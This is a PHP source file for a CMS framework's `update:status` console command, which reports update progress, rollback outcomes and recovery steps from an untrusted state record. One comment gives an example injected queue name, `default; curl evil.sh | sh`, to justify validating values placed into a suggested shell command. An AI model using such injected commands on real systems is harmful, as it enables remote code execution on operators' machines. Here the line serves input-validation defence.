<?php

declare( strict_types=1 );

namespace ArtisanPackUI\CMSFramework\Modules\Core\Updates\Console;

use ArtisanPackUI\CMSFramework\Modules\Core\Updates\Enums\UpdateRunStatus;
use ArtisanPackUI\CMSFramework\Modules\Core\Updates\Enums\UpdateStep;
use ArtisanPackUI\CMSFramework\Modules\Core\Updates\Managers\ApplicationUpdateManager;
use ArtisanPackUI\CMSFramework\Modules\Core\Updates\Support\ResolvesConfiguredPaths;
use Illuminate\Console\Command;

/**
 * Update Status Command
 *
 * Reports the outcome of the most recent `performUpdate()` run from the
 * persisted state marker. Exists so that an update killed mid-flight is
 * diagnosable — before this, "update in progress", "update died at step 6",
 * and "the site was manually put into maintenance mode" were
 * indistinguishable without reading framework source.
 *
 * @since 2.7.1
 */
class UpdateStatusCommand extends Command
{
    use ResolvesConfiguredPaths;

    /**
     * The name and signature of the console command.
     *
     * @since 2.7.1
     *
     * @var string
     */
    protected $signature = 'update:status
                            {--json : Output the raw persisted state as JSON}
                            {--clear : Discard the recorded state after reporting it}';

    /**
     * The console command description.
     *
     * @since 2.7.1
     *
     * @var string
     */
    protected $description = 'Report the status of the most recent application update';

    /**
     * Execute the console command.
     *
     * @since 2.7.1
     *
     * @param  ApplicationUpdateManager  $manager  Update manager.
     *
     * @return int Command exit code.
     */
    public function handle( ApplicationUpdateManager $manager ): int
    {
        $state = $manager->updateState();

        if ( null === $state ) {
            if ( $this->option( 'json' ) ) {
                $this->line( (string) json_encode( null ) );
            } else {
                $this->info( __( 'No application update has been recorded.' ) );
            }

            return self::SUCCESS;
        }

        // The record is read after a crash by definition, so treat every field
        // as untrusted rather than casting a half-written value.
        $status = UpdateRunStatus::tryFrom( $this->stringField( $state, 'status' ) );
        $step   = UpdateStep::tryFrom( $this->stringField( $state, 'step' ) );

        // Resolved before the output branch so both modes agree. `--json` is
        // the machine-consumption path — `php artisan update:status --json ||
        // alert` is the natural monitoring idiom — and it returned SUCCESS
        // unconditionally, so it never alerted on a failed or interrupted run
        // while the very same state without `--json` exited 1.
        $exitCode = null !== $status && $status->needsAttention() ? self::FAILURE : self::SUCCESS;

        if ( $this->option( 'json' ) ) {
            $this->line( (string) json_encode( $state, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES ) );

            $this->maybeClear( $manager );

            return $exitCode;
        }

        $this->renderSummary( $state, $status, $step );

        if ( UpdateRunStatus::Interrupted === $status ) {
            $this->renderRecovery( $step );
        }

        $this->maybeClear( $manager );

        return $exitCode;
    }

    /**
     * Render the headline status block.
     *
     * @since 2.7.1
     *
     * @param  array<string, mixed>  $state  Persisted state.
     * @param  UpdateRunStatus|null  $status  Parsed status, when recognised.
     * @param  UpdateStep|null  $step  Parsed step, when recognised.
     */
    protected function renderSummary( array $state, ?UpdateRunStatus $status, ?UpdateStep $step ): void
    {
        $label = $status?->label() ?? ( $this->stringField( $state, 'status' ) ?: __( 'Unknown' ) );

        $this->newLine();

        match ( $status ) {
            UpdateRunStatus::Completed   => $this->info( '✓ ' . $label ),
            UpdateRunStatus::Queued,
            UpdateRunStatus::InProgress  => $this->warn( '… ' . $label ),
            UpdateRunStatus::Failed,
            UpdateRunStatus::Interrupted => $this->error( '✗ ' . $label ),
            default                      => $this->line( $label ),
        };

        $this->newLine();

        $totalSteps = count( UpdateStep::cases() );

        $rows = [
            [__( 'From version' ), $this->stringField( $state, 'current_version' ) ?: '—'],
            [__( 'To version' ), $this->targetVersionField( $state, $status )],
            [
                __( 'Last step' ),
                null !== $step
                    ? "{$step->number()}/{$totalSteps} — {$step->label()}"
                    : ( $this->stringField( $state, 'step_label' ) ?: '—' ),
            ],
            [__( 'Started' ), $this->stringField( $state, 'started_at' ) ?: '—'],
            [__( 'Last updated' ), $this->stringField( $state, 'updated_at' ) ?: '—'],
            [__( 'PHP SAPI' ), $this->stringField( $state, 'php_sapi' ) ?: '—'],
        ];

        // Only present for a run that came through `dispatchUpdate()`. Shown
        // for the whole lifetime of such a run, not just while it is queued —
        // "which worker is meant to be running this" stays the operative
        // question right up until it finishes.
        $queuedAt = $this->stringField( $state, 'queued_at' );

        if ( '' !== $queuedAt ) {
            $rows[] = [__( 'Queued' ), $queuedAt];
            $rows[] = [__( 'Queue' ), $this->queueDescription( $state )];
        }

        $this->table( [__( 'Field' ), __( 'Value' )], $rows );

        $error = $this->stringField( $state, 'error' );

        if ( '' !== $error ) {
            $this->newLine();
            $this->line( __( 'Error:' ) );
            $this->error( $error );
        }

        if ( UpdateRunStatus::Failed === $status ) {
            $this->renderRollbackOutcome( $state );
        }

        if ( UpdateRunStatus::InProgress === $status ) {
            $this->newLine();
            $this->comment( __( 'An update is either still running or died without triggering its shutdown handler (e.g. `kill -9`). Check whether the recorded PID is still alive before intervening.' ) );
        }

        if ( UpdateRunStatus::Queued === $status ) {
            $this->renderQueuedGuidance( $state );
        }
    }

    /**
     * Explain what a `queued` record means and what makes it move.
     *
     * The single most likely reason a record sits here is a host with no queue
     * worker running — the failure mode `dispatchUpdate()`'s driver guard
     * cannot detect from the dispatching process, because whether a worker is
     * consuming a perfectly well-configured connection is not knowable from
     * config.
     *
     * @since 2.8.0
     *
     * @param  array<string, mixed>  $state  Persisted state.
     */
    protected function renderQueuedGuidance( array $state ): void
    {
        $this->newLine();
        $this->comment( __( 'The update has been pushed onto the queue and no worker has claimed it yet. Nothing has been changed on this installation.' ) );
        $this->newLine();
        $this->line( __( 'If it stays here, no worker is consuming :queue. Start one with:', ['queue' => $this->queueDescription( $state )] ) );

        $queueName  = $this->queueIdentifier( $state, 'queue_name' );
        $connection = $this->queueIdentifier( $state, 'queue_connection' );

        $command = 'php artisan queue:work'
            . ( '' === $connection ? '' : " {$connection}" )
            . ( '' === $queueName ? '' : " --queue={$queueName}" )
            . ' --tries=1';

        $this->comment( "  {$command}" );
    }

    /**
     * Read a queue connection or queue name for use inside a command the
     * operator is being invited to copy and paste.
     *
     * Every other field this command renders is rendered as data; this one is
     * rendered as a shell command, so a record carrying `default; curl evil.sh
     * | sh` would be printed as something to run. The record is read after a
     * crash by definition and the whole class treats it as untrusted, so the
     * value is dropped unless it looks like the plain identifier a connection
     * or queue name actually is.
     *
     * @since 2.8.0
     *
     * @param  array<string, mixed>  $state  Persisted state.
     * @param  string  $key  Field to read.
     *
     * @return string Field value, or an empty string when it is not a plain identifier.
     */
    protected function queueIdentifier( array $state, string $key ): string
    {
        $value = $this->stringField( $state, $key );

        return 1 === preg_match( '/^[A-Za-z0-9_.:-]{1,64}$/', $value ) ? $value : '';
    }

    /**
     * Human-readable description of the connection and queue a run was pushed
     * onto.
     *
     * @since 2.8.0
     *
     * @param  array<string, mixed>  $state  Persisted state.
     *
     * @return string Queue description.
     */
    protected function queueDescription( array $state ): string
    {
        $connection = $this->stringField( $state, 'queue_connection' ) ?: __( 'default' );
        $queueName  = $this->stringField( $state, 'queue_name' ) ?: __( 'default' );

        return "{$connection} / {$queueName}";
    }

    /**
     * The target version to display.
     *
     * A queued run records whatever the caller asked for, which is empty when
     * they asked for "latest" — resolving it at dispatch time would mean a
     * network round-trip in the request doing the dispatching. Rendering that
     * as `—` would read as "unknown" when it is in fact a deliberate choice.
     *
     * @since 2.8.0
     *
     * @param  array<string, mixed>  $state  Persisted state.
     * @param  UpdateRunStatus|null  $status  Parsed status, when recognised.
     *
     * @return string Field value.
     */
    protected function targetVersionField( array $state, ?UpdateRunStatus $status ): string
    {
        $target = $this->stringField( $state, 'target_version' );

        if ( '' !== $target ) {
            return $target;
        }

        return UpdateRunStatus::Queued === $status
            ? __( 'latest (resolved when the job starts)' )
            : '—';
    }

    /**
     * Report what became of the pre-update snapshot after a failed run.
     *
     * The status label used to assert "Failed (rolled back)" unconditionally,
     * so an operator looking at a **failed rollback** — the most dangerous
     * state this updater produces — was told the restore had succeeded.
     *
     * @since 2.7.1
     *
     * @param  array<string, mixed>  $state  Persisted state.
     */
    protected function renderRollbackOutcome( array $state ): void
    {
        // Treated as untrusted like every other field this command reads —
        // the record is examined after a crash by definition, so a
        // half-written or hand-edited value must not be able to masquerade as
        // a successful rollback.
        $rolledBack = $state['rolled_back'] ?? null;
        $rolledBack = is_bool( $rolledBack ) ? $rolledBack : null;

        $this->newLine();

        if ( true === $rolledBack ) {
            $this->info( __( 'The pre-update snapshot was restored successfully.' ) );

            return;
        }

        if ( false === $rolledBack ) {
            $this->error( __( 'The rollback ITSELF failed. The application tree is in an unknown state and needs manual attention — restore from :dir by hand before bringing the site back up.', ['dir' => $this->backupDirectory()] ) );

            return;
        }

        // A deliberate finish-forward (the run failed after the code and schema
        // were already applied) also records no rollback, but it is not the
        // alarming "partial update" case — the tree is whole and the correct
        // recovery is forward, not a restore.
        if ( true === ( $state['finish_forward'] ?? false ) ) {
            $this->info( __( 'The update failed after the code and schema were already applied, so the snapshot was deliberately NOT restored — finishing forward is the correct recovery, not a rollback.' ) );

            return;
        }

        $this->warn( __( 'No rollback was attempted — either backups are disabled, or the run failed before the snapshot was taken. The tree may still carry a partial update.' ) );
    }

    /**
     * Render the manual recovery checklist for an interrupted update.
     *
     * @since 2.7.1
     *
     * @param  UpdateStep|null  $step  Step the update died on.
     */
    protected function renderRecovery( ?UpdateStep $step ): void
    {
        $this->newLine();
        $this->warn( __( 'The update process died before finishing. The install may be half-applied.' ) );
        $this->newLine();

        $backupDir = $this->backupDirectory();

        if ( null === $step ) {
            $this->line( __( 'The step in flight was not recorded. Restore the pre-update snapshot from :dir before continuing.', ['dir' => $backupDir] ) );

            return;
        }

        // Steps 1-2 are special: nothing has overwritten the application tree
        // yet. Sending the operator to "restore the snapshot" is wrong at step
        // 1 (no snapshot exists) and actively dangerous at step 2, where a
        // death mid-backup can leave a *truncated* backup-*.zip that this
        // advice would invite them to extract over a perfectly healthy tree.
        if ( $step->number() <= UpdateStep::Backup->number() ) {
            $this->line( __( 'It died before any application files were modified, so the tree is untouched. Run `php artisan up` and retry the update — do not restore a snapshot.' ) );

            if ( UpdateStep::Backup === $step ) {
                $this->newLine();
                $this->comment( __( 'A partial backup archive may have been left behind in :dir. Delete it before retrying.', ['dir' => $backupDir] ) );
            }

            return;
        }

        if ( $step->number() < UpdateStep::ComposerInstall->number() ) {
            $this->line( __( 'It died during download or extraction, which is not resumable — the application tree may be partially overwritten. Restore the pre-update snapshot from :dir instead of finishing by hand.', ['dir' => $backupDir] ) );

            return;
        }

        $this->line( __( 'These steps had not completed. Run them in order to finish the update:' ) );
        $this->newLine();

        foreach ( $step->outstandingSteps() as $outstanding ) {
            $command = $outstanding->recoveryCommand();

            if ( null === $command ) {
                continue;
            }

            $this->line( "  {$outstanding->number()}. {$outstanding->label()}" );
            $this->comment( "     {$command}" );
        }

        $this->newLine();
        $this->line( __( 'If you would rather not finish by hand, restore the pre-update snapshot from :dir.', ['dir' => $backupDir] ) );
    }

    /**
     * Absolute path to the configured backup directory.
     *
     * The operator guidance above used to hardcode
     * `storage/backups/application/`, so a host that had customized
     * `cms.updates.backup_path` was pointed at a directory that does not
     * exist.
     *
     * @since 2.7.1
     *
     * @return string Resolved backup directory.
     */
    protected function backupDirectory(): string
    {
        return $this->resolveConfiguredPath(
            (string) config( 'cms.updates.backup_path', 'backups/application' ),
        );
    }

    /**
     * Read a field from the persisted record as a string, returning `''` for
     * anything that isn't a scalar. Guards against rendering a half-written or
     * hand-edited record — casting an array to string would emit a notice and
     * print "Array".
     *
     * @since 2.7.1
     *
     * @param  array<string, mixed>  $state  Persisted state.
     * @param  string  $key  Field to read.
     *
     * @return string Field value, or an empty string.
     */
    protected function stringField( array $state, string $key ): string
    {
        $value = $state[ $key ] ?? null;

        return is_scalar( $value ) ? trim( (string) $value ) : '';
    }

    /**
     * Discard the recorded state when `--clear` was passed.
     *
     * @since 2.7.1
     *
     * @param  ApplicationUpdateManager  $manager  Update manager.
     */
    protected function maybeClear( ApplicationUpdateManager $manager ): void
    {
        if ( ! $this->option( 'clear' ) ) {
            return;
        }

        $manager->clearUpdateState();

        if ( ! $this->option( 'json' ) ) {
            $this->newLine();
            $this->info( __( 'Recorded update state cleared.' ) );
        }
    }
}
